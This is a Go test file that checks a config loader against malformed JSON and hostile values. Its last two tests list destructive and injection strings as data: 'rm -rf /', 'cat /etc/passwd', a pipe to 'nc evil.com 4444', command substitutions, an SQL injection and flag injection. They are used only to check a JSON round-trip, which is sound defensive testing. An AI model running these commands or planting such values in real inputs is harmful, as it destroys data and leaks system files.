package config

import (
	"encoding/json"
	"os"
	"path/filepath"
	"testing"
)

// ---------------------------------------------------------------------------
// Config File Safety — malformed/hostile config parsing
// ---------------------------------------------------------------------------

func TestLoadMalformedJSON_TruncatedObject(t *testing.T) {
	withTempConfigDir(t)

	path, err := configPath()
	if err != nil {
		t.Fatalf("configPath: %v", err)
	}
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}

	// Truncated JSON — missing closing brace.
	if err := os.WriteFile(path, []byte(`{"default_shell": "bash"`), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	_, err = Load()
	if err == nil {
		t.Fatal("Load should fail with truncated JSON")
	}
}

func TestLoadMalformedJSON_NestedBomb(t *testing.T) {
	withTempConfigDir(t)

	path, err := configPath()
	if err != nil {
		t.Fatalf("configPath: %v", err)
	}
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}

	// Deeply nested JSON — Go's encoding/json handles this gracefully.
	nested := ""
	for i := 0; i < 100; i++ {
		nested += `{"a":`
	}
	nested += `"deep"`
	for i := 0; i < 100; i++ {
		nested += `}`
	}

	if err := os.WriteFile(path, []byte(nested), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	// Should not panic — may error (unknown fields) or succeed (extra keys ignored).
	cfg, err := Load()
	if err != nil {
		// Rejecting deeply nested JSON is acceptable.
		return
	}
	if cfg == nil {
		t.Fatal("Load returned nil config without error")
	}
}

func TestLoadMalformedJSON_NullValues(t *testing.T) {
	withTempConfigDir(t)

	path, err := configPath()
	if err != nil {
		t.Fatalf("configPath: %v", err)
	}
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}

	// JSON with explicit null values for all fields.
	nullJSON := `{
		"default_shell": null,
		"default_terminal": null,
		"default_time_range": null,
		"default_sort": null,
		"default_pivot": null,
		"show_preview": null,
		"max_sessions": null,
		"yoloMode": null,
		"agent": null,
		"model": null,
		"launchInPlace": null,
		"excluded_dirs": null,
		"custom_command": null,
		"hiddenSessions": null
	}`

	if err := os.WriteFile(path, []byte(nullJSON), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	// Load starts from Default() then unmarshals on top. Nulls zero out fields.
	// This should not panic.
	cfg, err := Load()
	if err != nil {
		t.Fatalf("Load with null values: %v", err)
	}

	// String fields should be zero-value after null override.
	if cfg.DefaultShell != "" {
		t.Errorf("DefaultShell = %q after null override, want empty", cfg.DefaultShell)
	}
}

func TestLoadMalformedJSON_WrongTypes(t *testing.T) {
	withTempConfigDir(t)

	path, err := configPath()
	if err != nil {
		t.Fatalf("configPath: %v", err)
	}
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}

	// max_sessions is int but we give a string — json.Unmarshal should error.
	wrongTypes := `{"max_sessions": "not-a-number", "show_preview": "yes"}`
	if err := os.WriteFile(path, []byte(wrongTypes), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	_, err = Load()
	if err == nil {
		t.Fatal("Load should fail when types don't match")
	}
}

func TestLoadMalformedJSON_EmptyFile(t *testing.T) {
	withTempConfigDir(t)

	path, err := configPath()
	if err != nil {
		t.Fatalf("configPath: %v", err)
	}
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}

	// Completely empty file — should error on json.Unmarshal.
	if err := os.WriteFile(path, []byte(""), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	_, err = Load()
	if err == nil {
		t.Fatal("Load should fail with empty file")
	}
}

func TestLoadMalformedJSON_BinaryGarbage(t *testing.T) {
	withTempConfigDir(t)

	path, err := configPath()
	if err != nil {
		t.Fatalf("configPath: %v", err)
	}
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}

	// Binary garbage that isn't valid JSON.
	garbage := make([]byte, 256)
	for i := range garbage {
		garbage[i] = byte(i)
	}
	if err := os.WriteFile(path, garbage, 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	_, err = Load()
	if err == nil {
		t.Fatal("Load should fail with binary garbage")
	}
}

func TestLoadMalformedJSON_ExtraFields(t *testing.T) {
	withTempConfigDir(t)

	path, err := configPath()
	if err != nil {
		t.Fatalf("configPath: %v", err)
	}
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}

	// JSON with unknown/extra fields — Go ignores unknown fields by default,
	// which is the safe behaviour.
	extra := `{"default_shell": "bash", "evil_field": "malicious", "nested": {"hack": true}}`
	if err := os.WriteFile(path, []byte(extra), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	cfg, err := Load()
	if err != nil {
		t.Fatalf("Load should succeed with extra fields: %v", err)
	}
	if cfg.DefaultShell != "bash" {
		t.Errorf("DefaultShell = %q, want 'bash'", cfg.DefaultShell)
	}
}

func TestLoadMalformedJSON_HugeArray(t *testing.T) {
	withTempConfigDir(t)

	path, err := configPath()
	if err != nil {
		t.Fatalf("configPath: %v", err)
	}
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}

	// excluded_dirs with many entries — should not cause OOM or crash.
	dirs := make([]string, 1000)
	for i := range dirs {
		dirs[i] = "/fake/dir/" + string(rune('A'+i%26))
	}
	cfg := Default()
	cfg.ExcludedDirs = dirs
	data, _ := json.Marshal(cfg)

	if err := os.WriteFile(path, data, 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	loaded, err := Load()
	if err != nil {
		t.Fatalf("Load with 1000 excluded dirs: %v", err)
	}
	if len(loaded.ExcludedDirs) != 1000 {
		t.Errorf("ExcludedDirs len = %d, want 1000", len(loaded.ExcludedDirs))
	}
}

// ---------------------------------------------------------------------------
// Config content safety — hostile values that could affect downstream use
// ---------------------------------------------------------------------------

func TestConfig_CustomCommandWithShellMetachars(t *testing.T) {
	// Verify that custom commands with shell metacharacters round-trip
	// through JSON without corruption.
	hostile := []string{
		"cmd && rm -rf /",
		"cmd; cat /etc/passwd",
		"cmd | nc evil.com 4444",
		"cmd $(whoami)",
		"cmd `whoami`",
		"cmd > /dev/null 2>&1",
		`cmd "quoted" 'single'`,
	}

	for _, cmd := range hostile {
		cfg := Default()
		cfg.CustomCommand = cmd

		data, err := json.Marshal(cfg)
		if err != nil {
			t.Fatalf("Marshal(%q): %v", cmd, err)
		}

		var restored Config
		if err := json.Unmarshal(data, &restored); err != nil {
			t.Fatalf("Unmarshal(%q): %v", cmd, err)
		}

		// The value must survive JSON round-trip exactly — we're not
		// sanitising at the config layer (that's the launcher's job),
		// but we must not corrupt it.
		if restored.CustomCommand != cmd {
			t.Errorf("CustomCommand round-trip: got %q, want %q", restored.CustomCommand, cmd)
		}
	}
}

func TestConfig_AgentModelWithSpecialChars(t *testing.T) {
	// Agent and Model are passed as --agent/--model flags. Verify they
	// round-trip cleanly even with hostile content.
	values := []string{
		"'; DROP TABLE sessions;--",
		"agent with spaces",
		"--malicious-flag",
		"-c 'evil command'",
		"$(whoami)",
		"agent\x00nullbyte",
	}

	for _, v := range values {
		cfg := Default()
		cfg.Agent = v
		cfg.Model = v

		data, err := json.Marshal(cfg)
		if err != nil {
			t.Fatalf("Marshal agent=%q: %v", v, err)
		}

		var restored Config
		if err := json.Unmarshal(data, &restored); err != nil {
			t.Fatalf("Unmarshal agent=%q: %v", v, err)
		}

		if restored.Agent != v {
			t.Errorf("Agent round-trip: got %q, want %q", restored.Agent, v)
		}
		if restored.Model != v {
			t.Errorf("Model round-trip: got %q, want %q", restored.Model, v)
		}
	}
}
